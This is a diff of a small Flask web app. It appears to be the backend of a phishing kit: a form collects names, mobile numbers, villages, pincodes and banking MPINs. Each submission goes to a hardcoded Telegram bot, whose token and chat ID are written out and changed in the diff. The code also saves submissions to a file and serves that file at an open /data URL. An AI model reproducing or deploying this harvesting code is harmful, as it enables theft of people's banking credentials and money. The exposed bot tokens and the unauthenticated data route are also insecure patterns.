@@ -16,11 +16,11 @@ def submit():
     mpin = request.form.get("mpin")
     pincode = request.form.get("pincode")
 
-    # validation
+    # ✅ Validation
     if not name or not mobile or not village or not mpin or not pincode:
         return "Please fill all fields"
 
-    # message
+    # ✅ Message format
     msg = f"""
 📥 New Data
 
@@ -31,9 +31,8 @@ def submit():
 📍 Pincode: {pincode}
 """
 
-    # telegram send
-    url = f"https://api.telegram.org/bot8721390421:AAHeLwV1GR68qNNzBjgfA5XvEaK7G1K3sKs/sendMessage"
-    
+    # ✅ Telegram send
+    url = "https://api.telegram.org/bot8721390421:AAHMZWDkcyise6LJfGj2RoOoTO06DoHgu2g/sendMessage"
     data = {
         "chat_id": "7021009916",
         "text": msg
@@ -41,11 +40,21 @@ def submit():
 
     requests.post(url, data=data)
 
+    # ✅ File save
+    with open("data.txt", "a") as f:
+        f.write(msg + "\n")
+
     return "Submitted successfully"
 
+# ✅ Data dekhne ke liye
 @app.route('/data')
 def show_data():
-    with open("data.txt", "r") as f:
-        return f.read()
+    try:
+        with open("data.txt", "r") as f:
+            return f.read()
+    except:
+        return "No data yet"
+
+# ✅ Run server
 if __name__ == "__main__":
     app.run(host="0.0.0.0", port=int(os.environ.get("PORT", 5000)))
